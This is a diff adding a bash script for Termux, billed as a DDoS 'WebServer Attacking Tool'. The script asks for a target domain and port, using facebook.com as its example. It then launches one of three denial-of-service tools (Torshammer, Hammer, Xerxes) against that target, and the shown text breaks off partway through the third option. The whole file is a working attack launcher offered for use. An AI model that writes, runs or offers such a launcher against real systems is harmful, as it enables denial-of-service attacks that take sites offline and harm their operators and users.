@@ -1,0 +1,69 @@
+#!/data/data/com.termux/files/usr/bin/bash
+# DDOS TOOLS FOR TERMUX
+# Made by V3rluchie
+# Recode The Copyright is not make you Coders
+
+#bersih
+clear
+
+
+echo "██████╗  ██████╗ ███████╗████████╗
+██╔══██╗██╔═══██╗██╔════╝╚══██╔══╝
+██║  ██║██║   ██║███████╗   ██║   
+██║  ██║██║   ██║╚════██║   ██║   
+██████╔╝╚██████╔╝███████║   ██║   
+╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   
+                                  "
+
+echo "=============================================="
+echo "#         DOST WebServer Attacking Tools     #"
+echo "#              Coded By V3rluchie            #"
+echo "#           verluchie@hackermail.com         #"
+echo "#             http://squadcyber.org          #"
+echo "=============================================="
+echo ""
+echo "Recode The Copyright is not make you Coders"
+echo "-------------------------------------------"
+echo ""
+echo "Enter domain of your target"
+echo "ex : http://facebook.com"
+echo ""
+read -p "[m4qlo@home]>" hai;
+echo ""
+echo ""
+echo "Enter port of your target"
+echo "Default : 80"
+echo ""
+read -p "[m4qlo@home]>" por;
+echo ""
+echo ""
+echo "Enter number of tool what do you want to use"
+echo ""
+echo "[1] Torshammer"
+echo "[2] Hammer"
+echo "[3] Xerxes"
+echo ""
+read -p "[m4qlo@home]>" tol;
+echo ""
+echo ""
+clear
+echo "Target : $hai"
+echo "Port   : $por"
+echo "Tool   : $tol"
+sleep 2
+echo "Attacking..........."
+sleep 1
+
+if [ $tol = 1 ] || [ $tol = 01 ]
+then
+cd ~/m4qlo/torshammer
+python2 torshammer.py -t $hai -p $por
+fi
+
+if [ $tol = 2 ] || [ $tol = 02 ]
+then
+cd ~/m4qlo/hammer
+python hammer.py -s $hai -p $por
+fi
+
+if [ $tol = 3 ] || [ $tol = 0
